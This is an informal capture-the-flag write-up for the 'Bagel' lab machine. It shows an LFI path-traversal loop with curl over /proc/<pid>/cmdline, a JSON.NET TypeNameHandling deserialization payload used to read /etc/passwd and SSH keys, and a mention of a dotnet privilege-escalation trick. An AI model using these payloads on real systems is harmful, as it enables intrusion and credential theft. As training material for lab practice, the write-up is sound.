we found lfi and we can read file

first thing after lfi is to read the ==proc== file

==/proc/self/cmdline ==     ==/proc/self/environ==

it give away important info .. like we got a app.py file in home dir.

so we looked at it and hosts a like ==ws://localhost==

so we used

==wscat== -c ws://bagel.htb:5000

to connect to server

so we decided to look at all the pid to find something useful as app.py says path to .dll

so we did

```
#!/bin/bash

for i in $(seq 0 1000);do
        echo -n  "$i:  "
        curl http://bagel.htb:8000/?page=../../../../../../../proc/$i/cmdline -o -
        echo
done;
```

to get all the pid and we got the path to .dll file in opt dir

we dwlded at used ==Dnspy== in windows to read the source code and found dev creds and a pathit has something ==TypeNameHandling== so we used

```
{
    "RemoveOrder": {
        "$type": "bagel_server.File, bagel"
        "ReadFile": "../../../../etc/passwd"
    }
}
```

to read files and got id_rsa ..

we opened wscat and sent this whole thing in a line

after that root was easy just a ==gtfobins dotnet== payload and we rooted it
